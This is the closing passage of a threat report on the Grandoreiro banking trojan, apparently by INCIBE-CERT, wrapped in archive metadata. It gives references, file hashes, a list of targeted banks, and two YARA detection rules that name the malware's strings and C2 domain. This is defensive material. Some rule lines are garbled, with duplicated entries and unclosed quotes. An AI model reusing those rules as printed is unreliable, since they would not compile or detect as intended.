https://seguranca-informatica.pt/the-](https://seguranca-informatica.pt/the-updated-grandoreiro-malware-equipped-with-latenbot-c2-features-in-q2-2020-now-extended-to-portuguese-banks/#.YgPmDoTMIdU)\n[updated-grandoreiro-malware-equipped-with-latenbot-c2-features-in-q2-2020-now-](https://seguranca-informatica.pt/the-updated-grandoreiro-malware-equipped-with-latenbot-c2-features-in-q2-2020-now-extended-to-portuguese-banks/#.YgPmDoTMIdU)\n[extended-to-portuguese-banks/#.YgPmDoTMIdU](https://seguranca-informatica.pt/the-updated-grandoreiro-malware-equipped-with-latenbot-c2-features-in-q2-2020-now-extended-to-portuguese-banks/#.YgPmDoTMIdU) (May 26, 2020) Last accessed: Feb.\n08, 2022.\n Pierluigi Paganini \"Grandoreiro Malware implements new features in Q2 2020 [\"](https://securityaffairs.co/wordpress/103853/malware/grandoreiro-malware-q2-2020.html)\n\n[https://securityaffairs.co/wordpress/103853/malware/grandoreiro-malware-q2-](https://securityaffairs.co/wordpress/103853/malware/grandoreiro-malware-q2-2020.html)\n[2020.html (May 27, 2020) Last accessed: Feb. 03, 2022.](https://securityaffairs.co/wordpress/103853/malware/grandoreiro-malware-q2-2020.html)\n Techbit “Grandoreiro: el virus troyano bancario que amenaza a México” El Universal\n\n[https://www.eluniversal.com.mx/techbit/grandoreiro-el-virus-troyano-bancario-que-](https://www.eluniversal.com.mx/techbit/grandoreiro-el-virus-troyano-bancario-que-amenaza-mexico/video/ciencia-y-salud/desinfectantes-caseros-estoy-sanitizando-bien-mi-hogar)\n[amenaza-mexico/video/ciencia-y-salud/desinfectantes-caseros-estoy-sanitizando-](https://www.eluniversal.com.mx/techbit/grandoreiro-el-virus-troyano-bancario-que-amenaza-mexico/video/ciencia-y-salud/desinfectantes-caseros-estoy-sanitizando-bien-mi-hogar)\n[bien-mi-hogar (May 04, 2020) Last accessed: Feb. 01, 2022.](https://www.eluniversal.com.mx/techbit/grandoreiro-el-virus-troyano-bancario-que-amenaza-mexico/video/ciencia-y-salud/desinfectantes-caseros-estoy-sanitizando-bien-mi-hogar)\n Satinfo “Ahora es a Carrefour a quien utilizan para conseguir que se ejecute un fichero\n\nspy Grandoreiro” [https://blog.satinfo.es/2019/ahora-es-a-carrefour-a-quien-utilizan-](https://blog.satinfo.es/2019/ahora-es-a-carrefour-a-quien-utilizan-para-conseguir-que-se-ejecute-un-fichero-spy-grandoreiro/)\n[para-conseguir-que-se-ejecute-un-fichero-spy-grandoreiro/ (Oct. 28, 2019) Last](https://blog.satinfo.es/2019/ahora-es-a-carrefour-a-quien-utilizan-para-conseguir-que-se-ejecute-un-fichero-spy-grandoreiro/)\naccessed: Feb. 02, 2022.\n\n\n-----\n\n### Appendix 1: Indicators of compromise (IOC)\n\n **Name (Installer): Archiv.Endes.Fact3101.msi**\n\n MD5: 6346c88c0d45779740b526dc7da79fc8\n\n SHA256:\n\n6a3b03e8a8a1edfcf33aebb9d55f81ed274196596a20db875e2ae923d6468bbd\n\n **name (Downloader DLL): Binary.Maui.dll**\n\n MD5:  20253c20ea35ec595c5577604f8a2730\n\n SHA256:\n\n58084c86acd68c83d84802ef8daa9cdfefdcf34d7fa1b9a0e04c4ca124e58382\n\n **Name (Trojan DLL): dbghelp.dll**\n\n MD5:  98ef8e5ef3bef928537d4fd25c53380a\n\n SHA256:\n\n35c0744bec0e123d24a9ffd3d7a9edeb07d9341ab45619b5fc881ce7dd81276a\n\n **List of affected financial institutions**\n\n| List of affected financial|institutions|Col3|\n|---|---|---|\n|AMARELO|Liberbank|HSBCUK|\n|BRSUL|Openbank|barclaysUK|\n|BancodaAmazonia|ING|BICE|\n|Banpara|Pichincha|Ripley|\n|Santander|CaixaGeral|Bci|\n|Banese|Mediolanum|Chile|\n|Bradesco|Unicaja|BancoEstado|\n|AGY|TRIODOS|Falabella|\n|inter|ACTIVOBANK|Santander|\n|Sicoob|ACTIVOBANKPT|Scotiabank|\n|Sicredi|novobancopt|PortugalBBVA|\n|Caixa|santapt|bancobcr|\n|itau|MONTEPIOpt|BarclaysES|\n|nordeste|millenniumbcppt|BNPParibas|\n|paulista|Caixadirectapt|CaixaGuissona|\n|Scotiabank|EuroBicpt|Cajasur|\n|brb|ibercaja|CitiBusiness|\n|Cetelem|BancoAzteca|Commerzbank|\n|Banestes|Citibanamex|Deutsche|\n|Original|Banorte|EVOBanco|\n\n\n-----\n\n|CajaRural|Scotiabank|BMN|\n|---|---|---|\n|Sabadell|BPI|MicroBank|\n|BANKINTER|Cecabank|MiBanco|\n|Bankia.es|natwest||\n\n\n**_Table 2. Financial institutions affected by Grandoreiro_**\n\n\n-----\n\n### Appendix 2: Yara Rules of detection\n\nThe following Yara rules detect the 2 versions of dll discussed in the study, both the\ndownloader and the trojan itself:\n\n```\nrule Grandoreiro_Banker_Downloader\n{ \n meta: \n  author = \"INCIBE-CERT\" \n  description = \"Detects the Grandoreiro banking Trojan downloader\" \n strings:\n  $delphidll1 = { BA ?? ?? ?? ?? 83 7D 0C 01 75 ?? 50 52 C6 05 ?? ?? ?? ?? ?? 8B 4D 08 89 0D ??\n?? ?? ?? \n  $delphidll2 = { 55 8B EC 83 C4 ?? B8 ?? ?? ?? ?? E8 ?? ?? FF FF E8 ? ?? FF FF 8D 40 00 }\n  $str1 = \" 2001, 2002 Mike Lischke\"\n  $str2 = \"8$4,6-9'$6.:*?#1pHhX~AeSlZrNbS\"\n  $str3 = \"Archive already has SFX stub\"\n  $str4 = \"Deflate64 compression method is not supported\"\n  $str5 = \"Delphi Component\"\n  $str6 = \"EDecompressionErrorneeded dictionary\"\n  $str7 = \"MakeSFX error\"\n  $str8 = \"Runtime error at 00000000\"\n  $str9 = \"Web site: http://www.componentace.com\"\n  $str10 = \"ScreenToClient\"\n  $str11 = \"SFXStub property is not specified\"\n  $str12 = \"SystemCurrentControlSettings Layouts\"\n  $str13 = \"SystemParametersInfoA\" $str13 = \"SystemParametersInfoA\"\n  $str14 = \"TAESCryptoTransform\" $str14 = \"TAESCryptoTransform\n  $str15 = \"TGetSiteInfoEvent\" $str15 = \"TGetSiteInfoEvent\"\n  $str16 = \"$TMultiReadExclusiveWriteSynchronizer\"\n  $str17 = \"to create a commercial product, please register and download\"\n  $str18 = \"URLDownloadToFileA\"\n  $str19 = \"VerLanguageNameA\"\n  $str20 = \"WndProcPtr%.8X%.8X\" $str20 = \"WndProcPtr%.8X%.8X\"\n  $str21 = \"you that your Personal Edition is provided for personal use only\"\n  $str22 = \"Zip64Mode\" $str22 = \"Zip64Mode\" $str22 = \"Zip64Mode\n condition:\n  uint16(0) == 0x5A4D // MZ\n  and uint16(uint32(0x3C)+0x18) == 0x010B //MZ header at 0x3C\n  and (uint16(uint32(0x3C)+0x16) & 0x2000) == 0x2000 //PE DLL signature\n  and any of ($delphidll*)\n  and all of ($str*)\n  and (filesize > 1400KB and filesize < 3000KB)\n}\n\n```\n\n-----\n\n```\nrule Grandoreiro_Banker_Trojan\n{ \n meta: \n  author = \"INCIBE-CERT\" \n  description = \"Detects the Grandoreiro banking Trojan\" \n strings:\n  $mzp = \"MZP\n  $str1 = \"yIdIOHandlerSocket\n  $str2 = \"ATIVARCAPTURAFULL\"\n  $str3 = \"ATIVARCAPTURAMAG\"\n  $str4 = \"AutoSessionsPingT\"\n  $str5 = \"v4.09 (2013.Q2)\"\n  $str6 = \"CallNextHookEx\"\n  $str7 = \"Cap.DfbBackingMode\"\n  $str8 = \"CryptPlugin.AfterDisconnect\"\n  $str9 = \"deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly\"\n  $str10 = \"DELETAKL\"\n  $str11 = \"DETONAPROCESSO\"\n  $str12 = \"EXIBIRMZ\"\n  $str13 = \"Gate_CryptPlugin\"\n  $str14 = \"GetType method not available for TRtcDataRow\"\n  $str15 = \"GUploadAnywhere_Super\n  $str16 = \".hopto.org\"\n  $str17 = \"Magnification.dll\"\n  $str18 = \"<member><name>RTC.DATASET.ROWS</name>\"\n  $str19 = \"Portable network graphics (AlphaControls)\"\n  $str20 = \"RemoteThreadCallbacks TRtcThreadCallback.DestroyCallback\"\n  $str21 = \"SUSPENDEACESSO\"\n  $str22 = \"ZDecompress_str.InflateInit\"\n condition:\n  $mzp at 0\n  and all of ($str*)\n  and (filesize > 140000KB and filesize < 400000KB)\n}\n\n```\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.incibe.es/sites/default/files/contenidos/estudios/doc/incibe-cert_study_grandoreiro_analysis_2022_v1.pdf"
    ],
    "report_names": [
        "incibe-cert_study_grandoreiro_analysis_2022_v1.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1693447693,
    "ts_updated_at": 1743041126,
    "ts_creation_date": 1653321633,
    "ts_modification_date": 1653321741,
    "files": {
        "pdf": "https://archive.orkl.eu/9865307892eaea55d65825c2e1895e933b5b304a.pdf",
        "text": "https://archive.orkl.eu/9865307892eaea55d65825c2e1895e933b5b304a.txt",
        "img": "https://archive.orkl.eu/9865307892eaea55d65825c2e1895e933b5b304a.jpg"
    }
}